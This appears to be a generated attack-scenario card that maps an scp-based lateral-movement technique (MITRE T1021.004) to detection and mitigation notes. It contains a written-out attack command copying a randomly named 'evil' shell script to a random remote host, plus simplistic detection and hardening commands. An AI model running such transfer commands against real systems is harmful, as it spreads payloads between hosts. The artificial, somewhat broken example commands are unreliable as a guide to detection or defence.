---
type: campaign
scenario_id: 248
tactic: Lateral Movement
technique: "T1021.004: Remote Services: SSH"
technique_id: T1021.004
tags: [campaign, lotl, lateral_movement]
---

# Using scp to copy malicious payload to remote Linux host.

## Threat Description
Using scp to copy malicious payload to remote Linux host.

## Attack Command
```
scp $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sh) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com:/tmp
```

## Detection Logic
Monitor scp: `ps aux | grep scp | grep sh`; Monitor SSH traffic: `netstat -anp | grep :22`.

## Mitigation
Restrict scp: `chmod 700 /usr/bin/scp`; Block SSH outbound: `iptables -A OUTPUT -p tcp --dport 22 -j DROP`.

## AI Training Prompt
Train AI to detect scp payload transfer and suggest SSH restrictions.

## References
- MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
